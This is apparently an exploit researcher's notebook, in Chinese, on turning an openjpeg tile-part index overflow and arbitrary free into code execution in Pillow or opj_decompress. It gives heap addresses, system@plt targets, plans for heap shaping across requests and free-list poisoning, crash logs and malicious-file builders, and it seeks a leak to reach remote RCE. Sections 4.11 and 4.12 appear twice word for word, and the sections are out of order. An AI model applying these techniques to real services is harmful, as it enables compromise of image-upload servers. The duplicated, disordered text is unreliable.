# 死路清单与源码级证伪（含判据）

> 目的：这份文档存在的唯一理由是**防止重复推导**。
> 下面的每一条都带「源码行号」或「实测日志行号」，可以作为硬约束直接引用；
> 没有证据的部分会明确标注 **[推断]**，不要当成结论继续往上堆。

---

## 0. 先看这里：原语的真实形状

在被"能不能写到 X"这类问题反复卡住之后，先把原语定性清楚。之后所有否定性结论都从这里推出来。

```
原语 1（越界写）：tp_index[tpsno] = tell + 0x72
  ├─ 值 = 文件内偏移（受 +0x17e 口径影响）
  ├─ 下标 tpsno 由 SOT 的 TPsot 决定，与 TLM 条目数解耦
  └─ 因此：**【值】和【落点】都只由文件内容与长度决定**，不依赖堆状态
原语 2（任意 free）：tcd.c:913  opj_image_data_free(l_tilec->data_win)
  ├─ data_win 位于 comps + 0x50
  ├─ 自由度高，但目标 ≡ comps − 0x1c0（实测反解，见 §2.4）
  └─ 位置在 opj_tcd_init_tile 内部，**早于 resolutions 的任何使用**（tcd.c:919）
```

值的语义决定了它能干什么，这一条比任何扫描都重要：

| 值形态 | 语义 | 可用性 |
|---|---|---|
| 64 位值 = 文件偏移 | 会被当作指针/长度 | 只看数值能否表达；与内存布局无关 |
| 32 位字段 = (小值, 0) | 高 32 位恒 0 | 任何依赖"两个 32 位拼 64 位"的构造都会退化成 0 |

---

## 1. 已实测成立（可复用，不是猜想）

| 项 | 证据 |
|---|---|
| 任意地址 `free` 可执行（目标是合法 chunk 时） | `free(0xe75420)` size=0x441 / `free(0xe78f20)` size=0x240 均无报错 |
| glibc 三道校验已量清 | ①`p&0xf==0` ②`*(p-8)` 合法 size ③已映射可写页 |
| 落点算术（误差 0） | `tp_index[i]=tell+0x72`；`comps=S_23+0x170`；自由度 = PAD / PRELAST |
| 堆地址可表达 | 非 PIE CPython，brk 堆固定 `0xe78f20` 一带；15MB 文件可写出该值 |
| 值可指向代码段 | `system@plt=0x420580`、`execve@plt=0x41f6e0`、`execv@plt=0x420ec0` |
| **双 free 结构性** | `w6.log` 行 629 与 644 各一行 `[FREE] 0xe75420 chunksize=0x441`（tcd.c:913 + tcd.c:2002） |
| **free 在 resolutions 之前** | 源码 `tcd.c:913` 早于 `tcd.c:919`；`r3.j2k` 实测 `strlen@got` 未改写 |

---

## 2. 本轮证伪（三条，全部是源码级，不是"试了一下不行"）

### 2.1 像素写 GOT —— 数学上不可能

```
tilec 的几何字段来自越界写槽值：
  +0x00  x0 | y0  = 槽[i]
  +0x08  x1 | y1  = 槽[i+1]
槽值 = tell（文件偏移，实测 < 2^24）
⇒ y0 = y1 = tell>>32 = 0
⇒ res_h = (y1 - y0) = 0
⇒ data_size_needed = res_w*res_h*4 = 0
```

再由 `tcd.c:760-792`（`opj_alloc_tile_component_data`）：

```
if (data==0 || (needed>size && !ownsData)) -> 分配（data 被换掉）
else if (needed>size)                     -> free(data)+分配（data 被换掉）
否则                                       -> data 指针保持原样
```

`needed=0` 落到"保持原样"分支，但 T1 没有像素可写 ⇒ **写 0 个像素**。
也就是说：要么不写，要么 `data` 被 free 掉。**不存在"把像素写进 data"这条分支。**

> 唯一的理论例外：文件 > 4GB，让 `tell>>32 != 0`，从而 y1-y0 非零。
> 上传场景下不可行，记录在此只为说明这不是"实现难度"而是"值域"问题。

### 2.2 `comps → fake tilecomp` —— 循环封闭

需求与代价互相矛盾：

```
要让写入值（=文件偏移）表达堆地址 0xe79xxx   ⇒ 文件 ≈ 15MB
但 read_sod 把每个 part 的 payload append 进 tcp->m_data
15MB 时 m_data 被 realloc 到 mmap 区（实测 0x7ad633c010, size=15176941）
⇒ 我们真正想指的那块缓冲已经在 mmap 区
⇒ 再要表达它，需要 ≈ 2TB 的文件
```

实测对照（`v1l.log`）：

```
[DBG TCP] ... m_data=0x7ad633c010 m_data_size=15176941
[DBG MAP] tile=0xe79150 numcomps=1 comps=0xe79850
[FREE]   0xe79850 chunksize=0x93ff00097e000000   ← "size" 是码流标记字节
double free or corruption (out)
```

`chunksize` 读成 `0x93ff00097e000000`（含 `FF93`/`FF90` 标记字节）这件事本身就说明：
**`comps` 落在的是装着 tile-part 标记流的缓冲里，不是我们那 112 字节的 fake 结构。**

canary 双重确认（`v1.j2k`，几何设 2×1、`data=0xb01000`）：

```
gdb: 0xb01000 内容未变（仍是 .data 原有指针表）
gdb: comps+0x08 = 0x0000000800000008（我们设的是 x1=2,y1=1）
gdb: free(x0=0xa0090ff00000000) ← 值由码流字节拼出，不是 fake 里的字段
```

⇒ 结论：**"让 comps 指向 payload 里的 fake 结构"这条路，被"文件大小 ↔ 分配区"耦合封死。**

### 2.3 `data` 保留机制 —— 真实存在，但拿不到

`opj_alloc_tile_component_data` 的"什么都不做"分支确实存在（见 §2.1 源码），
`tcd.c:919` 也确实是 `if (resolutions == 00)` 才分配。
**这两条本身没问题**，问题在入口条件被 §2.1 卡死：`needed` 恒为 0 或巨大。

这一条单独列出来，是为了以后不要再用"`data` 保留"作为前提往下推。

### 2.4 free 目标被自身公式锁死

```
实测反解：槽值（= free 目标）= comps − 0x1c0
而 comps 必须落在 tp_index 可达范围内
⇒ free 目标 ∈ [tp_index − 0x210, tp_index + 0x28]
⇒ GOT(0xa20f70)、tiles(0xe79150)、tilecomp 数组(0xdf39d0) 数学上不可达
```

这是过去所有"差一点"现象的**共同根因**，不是若干独立失败。

### 2.5 附加核查：free(tp_index) 之后没有复用（UAF 别名不成立）

`w4/w5/w6` 三份日志中，`[FREE] 0xe78f20` 之后**没有任何 ALLOC/REALLOC**。
⇒ "free 掉 tp_index 再让它被重新分配成可控结构"这条 UAF 别名路线，日志层面无支撑。

---

## 3. 黑名单（不用再试，试了就是浪费）

| 路线 | 否决理由 |
|---|---|
| `t1.c:2081 memcpy(cblkdata+cblk_len, chunk.data, chunk.len)` | 缓冲按同一个 `sum(len)` 分配，改 len 只会一起变大 |
| 像素写 GOT / 任意静态地址 | §2.1 高度恒 0 |
| comps 指向 payload fake | §2.2 循环封闭 |
| comps 指向 .bss 零窗口 | 几何全 0 → 不写；且清理 free 必崩 |
| 静态 `.data` 当假结构 | 无合法 chunk 头（唯一候选 PREV_INUSE=0） |
| tcache 投毒 | §1 双 free 结构性，必被 `double free` 检测拦下 |
| 靠 MIDLEN 线性外推调落点 | MIDLEN 改变 mmap/brk 分界，线性模型失效（实测偏差 ~0x100000） |
| error_handler 函数指针 | `event.c:136` 的 x0 是 vsnprintf 格式化缓冲，不是可控串 |
| free(tp_index) → UAF 复用 | §2.5，free 之后无分配 |

---

## 4. 唯一仍未排除的方向（附可验证判据）

现有事实里有一条从未被利用：

```
[ALLOC calloc] n=23 s=24 -> 0xe78f20     ← tp_index
tiles = 0xe79150 = tp_index + 0x230      ← 越界写就落在它上面
写入值可以 = system@plt = 0x420580       ← 4.3MB 文件即可表达
```

**缺的只有一个：`tp_index` 上游/下游的邻居里，有没有含函数指针的对象。**
`opj_codec_private` 的 `error_handler/warning_handler/info_handler`、
`opj_j2k_t` 的 `m_procedure_list` 这类结构，候选都在这里。

判据（三条必须同时满足，缺一条就是死路）：

1. 落点在 `[tp_index, tp_index + 越界可达长度]` 内；
2. 目标槽的**值语义是指针**（不是长度/计数）；
3. 写入值可被文件偏移表达（即 < 文件长度，且低位不会撞 `IS_MMAPPED`）。

**下一步只做一件事**：不扫描、不试错，按 calloc/malloc 顺序把 `tp_index` 前后的对象
一个个点名（`[DBG MAP]`/`[ALLOC]` 日志里已有全部地址与尺寸），对照 `opj_*_t` 的字段布局，
找出"指针语义字段落在可达区间"的那一个。找到就继续，找不到就把仓库口径固定在：
**本地任意读写 + 任意 free 已实证；远程 = DoS 稳定；远程 RCE 未达成。**

### 4.1 实测结果：本节也已封闭

按上面的方法点名完毕（`win.py`，数据源 `v1l.log`）：

```
可达窗口 [0xe79150, 0xe7a710] = [tp_index+0x230, tp_index+0x17e8]
  0xe79150  calloc(1, 856)  ← tiles（opj_tcd_tile_t），窗口内【唯一】对象
  其后至窗口末尾：heap top（未分配，写了就破坏 top size）
```

- `tiles` 里唯一的指针槽是 `+0x18 comps`；写它是**类型混淆**（被当 `opj_tcd_tilecomp_t*` 解引用），
  不是"调用"，不满足判据 2 ⇒ 不构成劫持点。
- 唯一指针语义之外的字段（`x0/y0/x1/y1`、`numcomps`、`numpix`）全是长度/计数 ⇒ 前面 §2.1 已证死。

另试过"换窗口"这一自由度（`nb_tps` 决定 `tp_index` 落点）：

```
TLM 条目 = 1,2,5,6,7,8,10,12,14  ⇒ nb_tps 恒为 0 ⇒ 不越界，[*] load ok
TLM 条目 ≈ 29                    ⇒ nb_tps = 23 ⇒ tp_index = 0xe78f20（大地址）
```

⇒ **不存在"小 nb_tps 让 tp_index 落到低地址、从而覆盖 codec/stream/tcd"的配置**：
`nb_tps` 只有在条目足够多时才非零，而此时 `tp_index` 必然在大地址。

### 4.2 根因（一句话）

越界写是**单调向高地址**的；而所有含函数指针的对象（`opj_stream_private` 的
`m_read_fn/skip_fn`、`opj_codec_private` 的 `m_event_mgr`、`opj_j2k_t` 的
`m_procedure_list`）都是**在 `tp_index` 之前**分配的（低地址）。
`tp_index` 分配点在 `read_sod()`（解码阶段，最晚），其后只会跟 `tiles` 和 top chunk。

**这是顺序约束，不是数值约束。** 换文件、换 PAD、换几何都改不动它。

### 4.3 重要修正：上述结论**只对 Pillow 宿主成立**

上面这段写于只验证过 Pillow 的阶段。换成真宿主 `opj_decompress` 后结论被推翻：

```
环境：系统 libopenjp2 2.5.0（Ubuntu 2.5.0-2ubuntu0.5）
  opj_decompress p.jp2            → rc=0, 正常解码
  ⇒ Ubuntu 已回补，系统库无洞；ImageMagick / GDAL / opj_* CLI 走系统库，装了也没用

环境：同一个 opj_decompress 二进制 + LD_LIBRARY_PATH=/tmp（我们的 2.5.4 带符号）
  opj_decompress p.jp2            → rc=134 Aborted
  tp_index = 0x300003d060（6 项 = 144B）
  0x300003d100 = tp_index + 0xa0 → malloc(320) = 4 × sizeof(opj_tcd_cblk_dec_t)
  [FREE] 0x300003d100 chunksize=0x20be3   ← 0x20be3 就是我们的文件偏移值
  munmap_chunk(): invalid pointer
  ⇒ 越界写直接命中 cblks.blocks 的 chunk 头，窗口内不再是 tiles
```

`opj_tcd_cblk_dec_t`（`tcd.h`）含 `segs*` / `chunks*` **两个指针字段**，
且 `cblks.blocks` 由 `opj_malloc` 分配（`tcd.c:1171`，不清零，保留旧字节）。

**所以“`tp_index` 后面只有 tiles”是 Pillow 分配序列的产物，不是这个 bug 的性质。**
但同一发也暴露了更硬的限制：`0x300003d060 ≈ 200GB`，而文件只有 134KB ⇒ 值域不可表达，
真宿主这条依然封。

### 4.4 仍未封的唯一方向：跨请求堆塑形

`d2.log` 已给出证据：同一份代码、只因为之前解码过别的文件，
`l_tcp` 相对 `tp_index` 从“上方”变成“下方”：

```
t2.log:  tp_index(tile0) = 0xe78f20   l_tcp = 0xe6fb10   ← tcp 在下（不可达）
d2.log:  tp_index(tile0) = 0xe58410   l_tcp = 0xe77780   ← tcp 在上（可达）
```

`opj_tcp_t` 含 `m_data`（码流基址）与 `m_data_size` ⇒ 指针语义。
Pillow 宿主下 `tp_index ≈ 0xe78f20`，值域可表达（15MB 文件），
唯一缺的是“让 `tp_index` 落进低地址空洞、上方正好是 `l_tcp`”这一堆状态。

**判据**：同一进程 → 先解码塑形文件 A（制造空洞）→ 再解码攻击文件 B
→ 日志出现 `tp_index` 落在 A 留下的空洞里，且 `[DBG TCP] l_tcp` 数值大于 `tp_index`。

---

## 5. 方法论沉淀（可泛化，比单条漏洞更值钱）

1. **先给原语定性，再找受害者。**
   写 N 字节的原语，第一步不是找哪里能写，而是问：这 N 字节会被当作「地址」还是「长度/计数」？
   地址型原语的可用性 = 内存布局的函数；长度型原语的可用性 = 只需数值能表达。
   本次大量"看起来被限制死"的现象，根因都是判错了值的语义。

2. **canary 必须用"字段值/特征字节"，不能用"地址巧合"。**
   `comps` 命中与否，不能靠"地址看起来对"，要靠"读出来的 x1/y1 是不是我设的 2/1"、
   "chunksize 是不是读成了 FF93 标记字节"。

3. **判别器优先于扫描。**
   自己写一个只回答一个是非问题的判别器（`disc.py` 看结构体字段、`cdis*.c` 看调用序列、
   `mkparse.py` 比标记序列），比跑十次插桩更快。
   注意判别器自身不能引入第二个同类实例（`cdis.c` 曾因双 openjpeg 造出假死）。

4. **源码顺序也是约束。**
   `free(data_win)`（tcd.c:913）早于 `resolutions` 使用（tcd.c:919）——
   这类"谁在前"的问题，比"能不能写到"更早决定链条是否成立。

5. **失败要记，但只记能泛化的。**
   值得写下来的：值语义决定可用性；解释器+状态+反馈的结构天然有"旧字节被当新对象"的问题。
   不值得写下来的：某一次偏移算错、某个 PAD 少加了 0x80。

---

## 6. 日志与样本索引（本机 `/tmp/ourpy/`）

| 文件 | 用途 |
|---|---|
| `w4.log` / `w5.log` / `w6.log` | 任意 free 三次实测；w6 含双 free 证据（629/644 行） |
| `v1l.log` | `comps→fake` 失败样本：m_data mmap、chunksize=标记字节、read_sod×29 |
| `v1.j2k` / `v4.j2k` / `v5.j2k` | 上述结论对应的样本（15MB 级） |
| `disc.py` | 从日志重建 `opj_tcd_tile_t` 字段视图 |
| `mkparse.py` | 文件级标记序列对比（证明构造器无问题） |
| `cdis3.c` / `cdis4.c` | 纯 openjpeg 判别器（证明"卡死"是 Pillow 侧特有） |

### 4.5 PHP 同构分支：形状在，燃料被擦掉（已封）

`tcd.c:1356-1370`（`opj_tcd_code_block_dec_allocate` 的 else 分支）与 CVE-2026-109618 的
`cleanup { efree(part->data) }` 是同一形状：**消费复用内存里的旧字节**。

```
tcd.c:1358  l_segs            = p_code_block->segs;              // 旧字节当指针
tcd.c:1359  l_current_max_segs= p_code_block->m_current_max_segs; // 旧字节当长度
tcd.c:1364  opj_aligned_free(p_code_block->decoded_data);          // free(旧字节)
tcd.c:1369  for (i < l_current_max_segs) opj_tcd_reinit_segment(&l_segs[i]); // 按旧长度写0
```

实测为什么不可用（三点，全部可复核）：

```
① 销毁路径擦干净：tcd.c:2361 dec_deallocate → segs=00 / chunks=00 / decoded_data=NULL
② ghost2.py 判别器：d3.log 132 alloc / 214 free，free-without-alloc = 0
   （首轮 3 个“幽灵 free”是 realloc 第二形态未解析导致的误报，修正后归零）
③ 320B 块的唯一来源就是 cblks.dec（两个调用点相差 0x84，同一函数的 if/else）
   ⇒ 没有“别的结构留下的 320B 残块”可以被复用
```

**结论**：这个分支需要一个“库里自己留下、且仍有效的指针”。openjpeg 在 deallocate 时
把它擦成 NULL，所以没有燃料。要用它，必须先有一次信息泄漏（用来填 `decoded_data`），
否则就是把一个未知值塞进 `free()`。

### 4.6 目前所有“写”原语的共同形状（一句话）

```
值域自由（文件字节） → 但没有地址
有地址（tp_index 邻域） → 但值只能是文件偏移
```

两者从来没有同时成立过。这就是为什么每一轮都“差一点”。
**下一步唯一值得做的：找一处能把堆地址送回攻击者的读原语（leak）。**
有了 leak，4.5 这条立刻从“封”变成“可用”——因为它只缺一个地址。

### 4.7 发现器：分配/写入口径不一致探测器（已可用）

```
tools/guard_alloc.c   LD_PRELOAD 分配器：每个 >=THRESH 的块按页 mmap，尾部贴 PROT_NONE
                       覆盖 malloc/calloc/realloc + memalign/aligned_alloc/posix_memalign
用法  gcc -shared -fPIC -O2 -o guard.so guard_alloc.c -ldl
      LD_LIBRARY_PATH=<clean 2.5.4> LD_PRELOAD=./guard.so GUARD_THRESH=64 opj_decompress -i X.j2k
```

**关键**：openjpeg 的大缓冲走 `opj_aligned_malloc`（t1->data / tilec->data / decoded_data），
只 hook `malloc` 的版本对它们完全无保护 —— 第一版 guard 就踩了这个盲区，
必须同时 hook `posix_memalign/aligned_alloc/memalign` 才覆盖到最该越界的地方。

验收（同一 PoC，同一 release 构建）：

```
系统库 2.5.0（已回补）        rc=0
干净 2.5.4 + guard          rc=139
base.j2k / w8.j2k + guard   rc=0（无误报）
```

**边界**：guard 按页分配会彻底改掉堆布局，因此它只能做“越界判定”，
不能用来测地址、不能把它的地址写进利用链。

### 4.8 SIZ/几何定点变异：静默

对干净基线 w8（nb_tps=0，不触发已知洞）做单字段变异，`tools/mut_siz.py`：

```
XTsiz=1 / YTsiz=1 / XTsiz=0xffff / YTsiz=0xffff      rc=0/1（无崩溃）
Xsiz=0x7fff / Ysiz=0x7fff / Xsiz=0x10000             rc=0
XRsiz=2 / YRsiz=2                                    rc=0
XOsiz=0x80                                           Header 校验拒绝
Xsiz/Ysiz=0xffffffff                                  Header 校验拒绝
```

⇒ 尺寸/采样这条轴在 **release 2.5.4 + guard** 下没有“分配≠写入跨度”。
下一批该打 COD（cblkw/cblkh/numres/precinct）与多 tile 组合，
因为那是 openjpeg 里唯一还在用 UINT32 算缓冲尺寸的地方。

### 4.9 跨请求堆塑形：确认可控，但方向与值域相反（实测）

同一进程内先解码 A、再解码 B（Pillow 12.3.0 + 2.5.4 插桩），B 的 `tp_index` 落点：

```
单跑 B (w6.j2k, 15183384 B)          tp_index = 0xe78f20
A PAD=0x100000 (1.0 MB)  -> B         tp_index = 0xf7f5d0   (A 段 Aborted)
A PAD=0x400000 (4.2 MB)  -> B         tp_index = 0xe7e230
A PAD=0x800000 (8.4 MB)  -> B         tp_index = 0xe7e230
A PAD=0xb00000 (11.5 MB) -> B         tp_index = 0xe7e1a0
```

结论：

1. **堆历史确实能移动 `tp_index`**（0xe78f20 → 0xe7e1a0/0xe7e230/0xf7f5d0），
   这是“远程常驻进程连续请求”与“本地单次”的实质差别 ⇒ §4.4 的方向成立。
2. **但已测的每一种 A 都把它往高地址推**，而原语的值必须 ≤ 文件长度：
   `0xe7e1a0 = 15197600 > 15183384` ⇒ 一旦被推高就越过值域，反而不可利用。
3. 要让落点变低，A 必须**分配并释放一个与 `tp_index` 同尺寸类（552B→0x240 bin）的块**，
   让 B 的 `calloc(23,24)` 命中它（tcache 复用），此时 `tp_index` 地址 = A 那块地址（低）。

**下一步唯一判据（一句话）**：`B.tp_index == A.tp_index`。
达成即意味着“落点可被第一张图钉死在选定地址”，值域问题随之消失（因为可以选择低地址）。

### 4.10 【结构变化】塑形后 comps 进入可达窗口（新原语）

实测（`a23.log`，A=7.6KB 的 TLM-23 声明图，B=w6.j2k）：

```
B 段:  tp_index = 0xd82d90
      comps0   = 0xd83470 = tp_index + 0x6e0     ← 112B 的 opj_tcd_tilecomp_t 数组
      delta_data = 1808  (= 0x710)
```

意义：此前所有构造都假设“`tiles->comps` 在 `tp_index` 之上很远，必须用指针指过去”。
塑形之后它自己进了可达窗口（越界写步长 24B，`TPsot` 单字节可到 255）。

落点换算（`tpsno = (目标 - tp_index) / 24`）：

```
tpsno=73  → comps0 - 0x08   (x1|y1)
tpsno=74  → comps0 + 0x10   (compno | numresolutions)
tpsno=75  → comps0 + 0x28   (resolutions_size)
tpsno=76  → comps0 + 0x40   (data_size_needed)
tpsno=77  → comps0 + 0x58   (win_x0 | win_y0)
tpsno=78  → comps1 + 0x00   (下一个 tilecomp 的 x0|y0)
```

**这是“不需要知道地址的字段级写”**：落点由 tpsno 决定（相对 tp_index），
值仍受“= 文件偏移”限制，但这里所有目标字段都是 32 位计数/坐标，小值即可。

未验证（下一发才知道）：
- `tpsno` 能否真的超过 `nb_tps-1`（越界写发生在后续 tile-part 的 read_sod，
  需要 file 里真的有 ≥74 个 SOT，而 TPsot 单字节上限 255）；
- 命中 +0x10 时 `numresolutions` 会被写成 0（高 32 位），是否在 DWT 前就被使用。

判据（一句话）：`disc.py` 读出的 comps[0] 字段出现我们写入的 tell 值，
且不等 0（说明命中 +0x10 而不是 +0x08）。

### 4.11 【新构造】256 次可控写：TLM 覆盖全部 tile + nb_tps=1 + 多 part

之前所有实验都只用 1~2 次越界写（`tpsno` 只比 `nb_tps` 大 1~2）。
实际上写下标没有 255 以外的限制（`TPsot` 是单字节，最大 255），
真正的门是 **`nb_tps` 必须 > 0，否则索引路径关闭、一次写都不发生**。

构造规则（踩了两次坑才定下来）：

```
✗ TLM 只声明 1~2 条但不覆盖所有 tile  → TLM 被判无效 → nb_tps=0 → 零次写
✗ 手工改 TLM 长度                        → 后面所有 Psot 偏移失效 → broken data stream
✓ TLM 每个 tile 各 1 条（覆盖全部 tile）+ tile0 放 82 个 tile-part
  ⇒ nb_tps=1，索引路径开启，tpsno 走到 82
```

实测（`mk_fake.py ... 99`，`99` = 每 tile 一条模式）：

```
[DBG read_sod] tile=0 tpsno=0 nb_tps=1 cur_nb_tps=1 tp_index=0xe53f50
最大 tpsno = 82
[FREE] 0xe81190 chunksize=0x12d0     ← 0x12d0 = 4816，正是我们的文件偏移值
corrupted size vs. prev_size
```

意义：

1. 写下标上限是 **255**（`TPsot` 单字节）⇒ 一次文件最多 **256 次写**，
   窗口 = `[tp_index, tp_index + 255*24]` = `+0x17E8`。
2. 每次写的值 = **该 part 自己的文件偏移**，而偏移由 PAD 自由摆放 ⇒
   **256 个可选整数，落在连续 24B 步长的槽里**（每个值 ≤ 文件长度）。
3. 这些值可以落到 **chunk 头**上（实测 `chunksize` 被改成 0x12d0），
   也就是第一次拿到了“把选定小整数写进堆元数据”的能力。

**这是目前唯一不需要地址、不需要大文件的写形态**：落点由相对下标决定，
值由文件内容/长度决定，两者都不依赖 ASLR。

下一步（判据）：让 256 次写同时命中「某块的 size 字段」与「相邻块的 prev_size」，
拼出一个合法 fake chunk（size ≥0x20、16 对齐、PREV_INUSE 位正确），
然后由库自己的 free 去消费它 —— 判据是 `[FREE]` 打印出我们拼的 size，而不是 `corrupted`。

### 4.11 【新构造】256 次可控写：TLM 覆盖全部 tile + nb_tps=1 + 多 part

之前所有实验都只用 1~2 次越界写（`tpsno` 只比 `nb_tps` 大 1~2）。
实际上写下标没有 255 以外的限制（`TPsot` 是单字节，最大 255），
真正的门是 **`nb_tps` 必须 > 0，否则索引路径关闭、一次写都不发生**。

构造规则（踩了两次坑才定下来）：

```
✗ TLM 只声明 1~2 条但不覆盖所有 tile  → TLM 被判无效 → nb_tps=0 → 零次写
✗ 手工改 TLM 长度                        → 后面所有 Psot 偏移失效 → broken data stream
✓ TLM 每个 tile 各 1 条（覆盖全部 tile）+ tile0 放 82 个 tile-part
  ⇒ nb_tps=1，索引路径开启，tpsno 走到 82
```

实测（`mk_fake.py ... 99`，`99` = 每 tile 一条模式）：

```
[DBG read_sod] tile=0 tpsno=0 nb_tps=1 cur_nb_tps=1 tp_index=0xe53f50
最大 tpsno = 82
[FREE] 0xe81190 chunksize=0x12d0     ← 0x12d0 = 4816，正是我们的文件偏移值
corrupted size vs. prev_size
```

意义：

1. 写下标上限是 **255**（`TPsot` 单字节）⇒ 一次文件最多 **256 次写**，
   窗口 = `[tp_index, tp_index + 255*24]` = `+0x17E8`。
2. 每次写的值 = **该 part 自己的文件偏移**，而偏移由 PAD 自由摆放 ⇒
   **256 个可选整数，落在连续 24B 步长的槽里**（每个值 ≤ 文件长度）。
3. 这些值可以落到 **chunk 头**上（实测 `chunksize` 被改成 0x12d0），
   也就是第一次拿到了“把选定小整数写进堆元数据”的能力。

**这是目前唯一不需要地址、不需要大文件的写形态**：落点由相对下标决定，
值由文件内容/长度决定，两者都不依赖 ASLR。

下一步（判据）：让 256 次写同时命中「某块的 size 字段」与「相邻块的 prev_size」，
拼出一个合法 fake chunk（size ≥0x20、16 对齐、PREV_INUSE 位正确），
然后由库自己的 free 去消费它 —— 判据是 `[FREE]` 打印出我们拼的 size，而不是 `corrupted`。

### 4.12 per-part 长度构造器 + 两个坑（实测）

`tools/mk_pp.py <模板> <out> <N> <OFF_K1> <OFF_K2>`：
N 个连续 TPsot 的 tile-part，并可把第 74/76 个 SOT 顶到指定文件偏移
（偏移即写入值 ⇒ 可指定「写到哪个下标、写成什么」）。

**坑 1：TLM 的 L 字段 = 4 + 3n，不是 2 + 3n**

```
写成 2+3n ⇒ 解析器提前 2 字节找下一个标记 ⇒ "Marker length too small" / 结构全乱
正确：L = 4 + 3n（含 Ztlm/Stlm 两字节）
```

**坑 2：手工改 TLM 长度会让所有 Psot 失效**（必须由构造器一次生成）。

实测（`pp0.j2k`，10 part）：

```
nb_tps=1（每 tile 一条 TLM）⇒ 索引路径开启
tpsno=0,1,... 递增；越界写发生（corrupted size vs. prev_size）
```

实测（`pp1.j2k`，77 part，15.18MB）：

```
tpsno 到 76 ✓，【*】load ok ✓（解码全程完成）
清理阶段 corrupted double-linked list
但：tp=0xe4f590  comps0=0xdf39d0  ⇒ comps 在 tp 下方，向上写够不到
0xb21ed0 内容完好（仍是 Python 静态对象）⇒ 未被写
```

⇒ **结论：单次解码下 `tiles->comps` 落在 tp_index 下方（112B 块多来自 128 tcache bin，地址低）；
只有「A 先塑形、再解 B」时它才跑到上方（a23 的 delta=+0x6e0）。**

所以「index 74 → comps+0x20 → resolutions=静态 .data」这条要成立，
必须与塑形同时满足，而且塑形后 part 数不能变（否则布局又翻回去）。
下一步判据：塑形后仍满足 `delta>0` 且 `(delta+0x20-0x10)/24 == 目标 index`。

### 4.12 per-part 长度构造器 + 两个坑（实测）

`tools/mk_pp.py <模板> <out> <N> <OFF_K1> <OFF_K2>`：
N 个连续 TPsot 的 tile-part，并可把第 74/76 个 SOT 顶到指定文件偏移
（偏移即写入值 ⇒ 可指定「写到哪个下标、写成什么」）。

**坑 1：TLM 的 L 字段 = 4 + 3n，不是 2 + 3n**

```
写成 2+3n ⇒ 解析器提前 2 字节找下一个标记 ⇒ "Marker length too small" / 结构全乱
正确：L = 4 + 3n（含 Ztlm/Stlm 两字节）
```

**坑 2：手工改 TLM 长度会让所有 Psot 失效**（必须由构造器一次生成）。

实测（`pp0.j2k`，10 part）：

```
nb_tps=1（每 tile 一条 TLM）⇒ 索引路径开启
tpsno=0,1,... 递增；越界写发生（corrupted size vs. prev_size）
```

实测（`pp1.j2k`，77 part，15.18MB）：

```
tpsno 到 76 ✓，【*】load ok ✓（解码全程完成）
清理阶段 corrupted double-linked list
但：tp=0xe4f590  comps0=0xdf39d0  ⇒ comps 在 tp 下方，向上写够不到
0xb21ed0 内容完好（仍是 Python 静态对象）⇒ 未被写
```

⇒ **结论：单次解码下 `tiles->comps` 落在 tp_index 下方（112B 块多来自 128 tcache bin，地址低）；
只有「A 先塑形、再解 B」时它才跑到上方（a23 的 delta=+0x6e0）。**

所以「index 74 → comps+0x20 → resolutions=静态 .data」这条要成立，
必须与塑形同时满足，而且塑形后 part 数不能变（否则布局又翻回去）。
下一步判据：塑形后仍满足 `delta>0` 且 `(delta+0x20-0x10)/24 == 目标 index`。

### 4.13 【反转】越界写落在的是 free chunk，不是活对象

`tools/ts.py`（时序判别器）修正基准（取“最后一次 decode 之后的首个 read_sod”）后的结果：

```
B 段首个 read_sod = 行 395
0xd1a810  行258  80B  before=YES  FREED BEFORE
0xd1a7f0  行376  24B  before=YES  FREED BEFORE
```

⇒ 窗口内那些对象确实早于写入时刻存在，但**都已经被 free**。
它们不是活对象，而是 A23 塑形时分配、随后释放的空闲块。

意义完全变了：

| 旧认知 | 实际 |
|---|---|
| 写“活对象字段” ⇒ 需要对象还在 | 写的是 **free chunk 的 fd / key / next** |
| 需要知道堆地址才能指 | 值只要能被文件偏移表达即可（小整数） |
| 会被 `memset(blocks,0,size)` 抹掉 | free chunk 内容会被**下一次 malloc 直接消费** |

⇒ 这条原语的真正形状是 **空闲链污染（tcache / unsorted poisoning）**，
而不是“字段级写”。它不需要地址，也不受 memset 干扰。

**两个已知道的阻碍**（必须在下一发一起看）：
1. glibc 2.35 的 tcache 有 `e->key == tcache` 检测（写坏 key ⇒ 可能 abort）；
2. `w6.log:629/644` 的双 free 结构性仍在（同一块被 free 两次）。

**下一发判据（一行）**：B 段解码过程中出现 `ALLOC ... -> 0x<小值>`
（malloc 返回了我们写入的偏移值当作地址）⇒ 空闲链被接管。

### 4.14 修正：§4.13 的“free chunk”结论不成立（附带真实写入轨迹）

§4.13 用 `ts.py` 判定窗口对象 `FREED BEFORE`，但那里有一个逻辑错误：
**`ts.py` 把 A 段的同名地址算进了 B 段**。同名地址不等于同一块内存。

按 B 段（`decode #2` 之后）自身的事件序列重查：

```
seq  31 : [ALLOC calloc] n=1 s=24 -> 0xd1a7f0    ← tp_index 本体，B 段【新分配】
seq  50 : [DBG read_sod] tpsno=0 tell=136
seq  57 : [DBG OOB-WRITE-IMMINENT] tpsno=1 write_at=+32 val=0xd4 / +40 val=0x116
seq 266 : tpsno=2 write_at=+56 val=0x122 / +64 val=0x162
```

⇒ `tp_index` 不是 A 的残留空闲块，而是 B 段自己的分配。
§4.13 的“写的是 free chunk 的 fd/key”因此**不成立**。

**另外三个实测事实**（`ap.log` B 段全段统计）：

```
tcache        出现 0 次
malloc():     出现 0 次
unsorted      出现 0 次
⇒ glibc 从未把这些块当空闲链处理，空闲链污染的前置根本不存在
```

**真实写入轨迹**（`pp1` + A23 塑形）：

```
tp_index #0 = 0xd1a7f0  size=24   (calloc(1,24)，只有一个元素！)
tp_index #1 = 0xd1a870  size=24
OOB 写:
  0xd1a818  val=0xd4      落在 tp_index#0 块内尾部
  0xd1a830  val=0x122
  0xd1a848  val=0x170
  ...
  0xd1a870 附近 val=0x20c   正好是 tp_index#1
```

⇒ 写入形状：**步长 24、值 = 严格递增的文件偏移，落点是 tp_index 之后的连续槽**。
目标里装的是 `opj_tp_index_t`（start_pos/end_pos），写坏只会让索引错乱。

**当前原语的准确定性**：

| 维度 | 实测值 |
|---|---|
| 值 | 小整数（文件偏移，0xd4~0x344） |
| 落点 | `tp_index + 24k`，k=1..76 |
| 目标对象 | `tp_index` 自己的槽（溢出的就是它自己） |
| 是否碰到空闲链 | 否（tcache/malloc()/unsorted 全 0） |
| 是否需要地址 | 否（落点是相对偏移） |

⇒ 它只适合写 **计数器/长度**，不适合写指针。
